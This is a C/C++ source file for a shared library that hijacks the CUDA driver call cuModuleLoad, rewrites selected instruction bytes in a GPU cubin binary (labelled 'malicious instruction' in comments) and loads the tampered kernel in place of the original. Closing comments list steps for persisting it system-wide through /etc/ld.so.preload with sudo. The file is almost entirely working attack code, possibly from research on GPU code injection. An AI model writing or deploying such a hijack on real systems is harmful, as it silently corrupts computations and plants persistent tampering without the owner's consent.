#include <stdio.h>
#include <string.h>
#include <iostream>
#include <cstring>
#include <cuda.h>


char* injector(const char* fname);


CUresult CUDAAPI cuModuleLoad(CUmodule *module, const char *fname)
{
	//1.inject malicous instruction into cubin
	char* image = injector(fname);
	
	
	//2.load malicious cubin image into cuModule
	CUresult code = cuModuleLoadData(module, image);
	if(code!=CUDA_SUCCESS)
	{
		const char* err_message = nullptr;
		cuGetErrorString(code, &err_message);
		printf("hijack error message = %s \n", err_message);
		return CUDA_ERROR_INVALID_VALUE;
	}
	
	
	printf("hijack success \n");
	return CUDA_SUCCESS;
}




char* injector(const char* fname)
{
    char* image;  //the image of the cubin
    
    
    //1.open cubin
    FILE* fp;
    int f_size;
    fp = fopen(fname, "rb"); //open fname in read binanry mode
    if (fp == NULL) {
        printf("fatbin file open failed \n");
        return NULL;
    }
    
    
    //2.allocate memory space for fatbin image
    fseek(fp, 0, SEEK_END);
    f_size = ftell(fp); //size of cubin
    image = (char*)malloc(f_size * sizeof(char));
    memset(image, '\0', f_size * sizeof(char));
    fseek(fp, 0, SEEK_SET);
    
    
    //3.detect attack entry point, and inject malicious instruction
    const int ins_bytes = 8;
    char ins_buffer[ins_bytes] = { 0 };
    size_t n_read;
    f_size = 0;
    while ( n_read=fread(ins_buffer, sizeof(char), ins_bytes, fp) ) { //read source cubin into instruction buffer
        //for (int i = 0; i < ins_bytes; i++) {
            //printf("0x%02X ", (unsigned char)ins_buffer[i]);
        //}
        //printf("\n");
        if ( (ins_buffer[ins_bytes-1]==0x36) && ( ins_buffer[ins_bytes-2]==0x68) ) {  //instruction filter detects opcode
            ins_buffer[2] = 0xe7; //0x57
            ins_buffer[3] = 0x0f; //0x0e
            //ins_buffer[2] = 0x47; //0x57
            //ins_buffer[3] = 0x06; //0x0e
        }
        memcpy(image + f_size, ins_buffer, n_read);  //copy instruction buffer into cubin image
        f_size = f_size + n_read;
    }
    
    
    //3.free source
    fclose(fp);
    
    return image;
}


//	"LD_PRELOAD=./hijack/hijack.so  ./segment_gpu/image_segment" has losed efficacy

// 	 cd ~/Desktop/ImageProcess/hijack
// 	 sudo mv image_hijack.so /usr/lib
//	sudo vim /etc/ld.so/preload
// 	/usr/lib/image_hijack.so













